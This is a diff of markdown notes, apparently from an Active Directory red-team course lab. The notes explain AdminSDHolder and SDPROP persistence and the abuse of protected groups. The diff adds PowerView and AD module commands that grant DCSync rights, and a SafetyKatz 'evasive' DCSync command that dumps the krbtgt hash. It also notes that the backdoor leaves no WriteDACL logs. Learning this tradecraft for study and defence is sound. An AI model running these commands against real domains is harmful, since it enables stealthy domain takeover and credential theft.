@@ -1,43 +1,6 @@
-**Essentially an ACL baseline that overwrites any changes made to protected groups**
+**Essentially an ACL baseline that overwrites any changes made to protected groups. This can only be edited with DA (or equivalent) membership**
 
-Resides in the System container of a domain and used to control the permissions - using an ACL - for certain built-in privileged groups (called Protected Groups)
-
-Security Descriptor Propagator (`SDPROP`) runs every hour and compares the ACL of protected groups and members with the ACL of `AdminSDHolder` and any differences are overwritten on the object ACL
-
-Protected Groups:
-
-| Account Operators | Enterprise Admins            |
-| ----------------- | ---------------------------- |
-| Backup Operators  | Domain Controllers           |
-| Server Operators  | Read-only Domain Controllers |
-| Print Operators   | Schema Admins                |
-| Domain Admins     | Administrators               |
-| Replicator        |                              |
-
-Well known abuse of some of the Protected Groups - All of the below
-can log on locally to DC:
-
-| Group             | Abuse                                                                                |
-| ----------------- | ------------------------------------------------------------------------------------ |
-| Account Operators | Cannot modify DA/EA/BA groups. Can modify nested group within these groups.          |
-| Backup Operators  | Backup GPO, edit to add SID of controlled account to a privileged group and Restore. |
-| Server Operators  | Run a command as system (using the disabled Browser service)                         |
-| Print Operators   | Copy ntds.dit backup, load device drivers                                            |
-
-With DA privileges (Full Control/Write permissions) on the
-`AdminSDHolder` object, it can be used as a backdoor/persistence
-mechanism by adding a user with Full Permissions (or other interesting
-permissions) to the `AdminSDHolder` object
-
-In 60 minutes (when `SDPROP` runs), the user will be added with Full
-Control to the AC of groups like Domain Admins without actually being a
-member of it
-
-
-> [!NOTE] **NOTE**
-> Adding a new object to the `AdminSDHolder` won't generate any new logs for `WreiteDACL`. The only way to get insights of abuse is by turning logging on group within the Advanced Security Settings
-
-###### **Adding permissions to `AdminSDHolder`**
+###### **Adding permissions to `AdminSDHolder` - OPSEC**
 
 Add `FullControl` permissions for a user to the `AdminSDHolder` using PowerView as DA
 ```powershell
@@ -101,3 +64,61 @@ Set-DomainUserPassword -Identity testda -AccountPassword (ConvertTo-SecureString
 
 Set-ADAccountPassword -Identity testda -NewPassword (ConvertTo-SecureString "Password@123" -AsPlainText - Force) -Verbose
 ```
+
+---
+##### Gaining `DCSync` rights to the domain object
+
+PowerView
+```powershell
+Add-DomainObjectAcl -TargetIdentity
+'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student1 -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
+```
+
+AD Module
+```powershell
+Set-ADACL -SamAccountName studentuser1 -DistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -GUIDRight DCSync -Verbose
+```
+
+Executing DCSync
+```powershell
+Loader.exe -path SafetyKatz.exe -args '"lsadump::evasive-dcsync /user:dcorp\krbtgt"'
+```
+
+
+Resides in the System container of a domain and used to control the permissions - using an ACL - for certain built-in privileged groups (called Protected Groups)
+
+Security Descriptor Propagator (`SDPROP`) runs every hour and compares the ACL of protected groups and members with the ACL of `AdminSDHolder` and any differences are overwritten on the object ACL
+
+Protected Groups:
+
+| Account Operators | Enterprise Admins            |
+| ----------------- | ---------------------------- |
+| Backup Operators  | Domain Controllers           |
+| Server Operators  | Read-only Domain Controllers |
+| Print Operators   | Schema Admins                |
+| Domain Admins     | Administrators               |
+| Replicator        |                              |
+
+Well known abuse of some of the Protected Groups - All of the below
+can log on locally to DC:
+
+| Group             | Abuse                                                                                |
+| ----------------- | ------------------------------------------------------------------------------------ |
+| Account Operators | Cannot modify DA/EA/BA groups. Can modify nested group within these groups.          |
+| Backup Operators  | Backup GPO, edit to add SID of controlled account to a privileged group and Restore. |
+| Server Operators  | Run a command as system (using the disabled Browser service)                         |
+| Print Operators   | Copy ntds.dit backup, load device drivers                                            |
+
+With DA privileges (Full Control/Write permissions) on the
+`AdminSDHolder` object, it can be used as a backdoor/persistence
+mechanism by adding a user with Full Permissions (or other interesting
+permissions) to the `AdminSDHolder` object
+
+In 60 minutes (when `SDPROP` runs), the user will be added with Full
+Control to the AC of groups like Domain Admins without actually being a
+member of it
+
+
+> [!NOTE] **NOTE**
+> Adding a new object to the `AdminSDHolder` won't generate any new logs for `WreiteDACL`. The only way to get insights of abuse is by turning logging on group within the Advanced Security Settings
+
